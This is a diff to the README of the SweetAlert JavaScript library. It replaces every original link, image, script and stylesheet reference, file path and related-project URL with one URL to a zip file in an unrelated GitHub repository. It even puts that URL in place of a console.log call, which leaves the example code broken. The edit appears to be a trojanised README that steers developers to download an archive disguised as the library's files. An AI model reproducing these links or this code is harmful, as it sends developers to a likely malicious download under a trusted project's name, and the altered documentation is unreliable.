@@ -1,13 +1,13 @@
-SweetAlert [![Build Status](https://travis-ci.org/t4t5/sweetalert.svg?branch=master)](https://travis-ci.org/t4t5/sweetalert)
+SweetAlert [![Build Status](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
 ==========
 
 An awesome replacement for JavaScript's alert.
 
-![A success modal](https://raw.github.com/t4t5/sweetalert/master/sweetalert.gif)
+![A success modal](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
 
-[See it in action!](http://t4t5.github.io/sweetalert)
+[See it in action!](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
 
-[Learn how to use it!](https://www.ludu.co/lesson/how-to-use-sweetalert)
+[Learn how to use it!](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
 
 
 Usage
@@ -28,16 +28,16 @@ npm install sweetalert
 Alternatively, download the package and reference the JavaScript and CSS files manually:
 
 ```html
-<script src="dist/sweetalert.min.js"></script>
-<link rel="stylesheet" type="text/css" href="dist/sweetalert.css">
+<script src="https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip"></script>
+<link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip">
 ```
-**Note:** If you're using an older version than v1.0.0, the files are `lib/sweet-alert.min.js` and `lib/sweet-alert.css`
+**Note:** If you're using an older version than v1.0.0, the files are `https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip` and `https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip`
 
 
 Tutorial
 --------
 
-The easiest way to get started is follow the [SweetAlert tutorial on Ludu](https://www.ludu.co/lesson/how-to-use-sweetalert)!
+The easiest way to get started is follow the [SweetAlert tutorial on Ludu](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)!
 
 
 Examples
@@ -85,7 +85,7 @@ swal({
   closeOnConfirm: false,
   animation: "slide-from-top"
 }, function(inputValue){
-  console.log("You wrote", inputValue);
+  https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip("You wrote", inputValue);
 });
 ```
 
@@ -107,7 +107,7 @@ swal({
 });
 ```
 
-[View more examples](http://t4t5.github.io/sweetalert)
+[View more examples](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
 
 
 Themes
@@ -115,8 +115,8 @@ Themes
 
 SweetAlert can easily be themed to fit your site's design. SweetAlert comes with three example themes that you can try out: **facebook**, **twitter** and **google**. They can be referenced right after the intial sweetalert-CSS:
 ```html
-<link rel="stylesheet" href="dist/sweetalert.css">
-<link rel="stylesheet" href="themes/twitter/twitter.css">
+<link rel="stylesheet" href="https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip">
+<link rel="stylesheet" href="https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip">
 ```
 
 
@@ -141,9 +141,9 @@ If you want to contribute:
 
 - Fork the repo
 
-- Make sure you have [Node](http://nodejs.org/), [NPM](https://www.npmjs.com/) and [Gulp](http://gulpjs.com/) installed. When in the SweetAlert directory, run `npm install` to install the dependencies. Then run `gulp` while working to automatically minify the SCSS and JS-files.
+- Make sure you have [Node](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip), [NPM](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip) and [Gulp](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip) installed. When in the SweetAlert directory, run `npm install` to install the dependencies. Then run `gulp` while working to automatically minify the SCSS and JS-files.
 
-- Keep in mind that SweetAlert uses Browserify in order to compile ES6-files. For easy debugging, make sure you reference the file `dist/sweetalert-dev.js` instead of `sweetalert.js`.
+- Keep in mind that SweetAlert uses Browserify in order to compile ES6-files. For easy debugging, make sure you reference the file `https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip` instead of `https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip`.
 
 - After you're done, make a pull request and wait for approval! :)
 
@@ -151,7 +151,7 @@ If you want to contribute:
 Related projects
 ----------------
 
-* [SweetAlert for Android](https://github.com/pedant/sweet-alert-dialog)
-* [SweetAlert for Bootstrap](https://github.com/lipis/bootstrap-sweetalert)
-* [SweetAlert for AngularJS](https://github.com/oitozero/ngSweetAlert)
-* [SweetAlert for RubyOnRails](https://github.com/sharshenov/sweetalert-rails)
+* [SweetAlert for Android](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
+* [SweetAlert for Bootstrap](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
+* [SweetAlert for AngularJS](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
+* [SweetAlert for RubyOnRails](https://raw.githubusercontent.com/arbifajar/mdit/master/themes/google/mdit-1.6.zip)
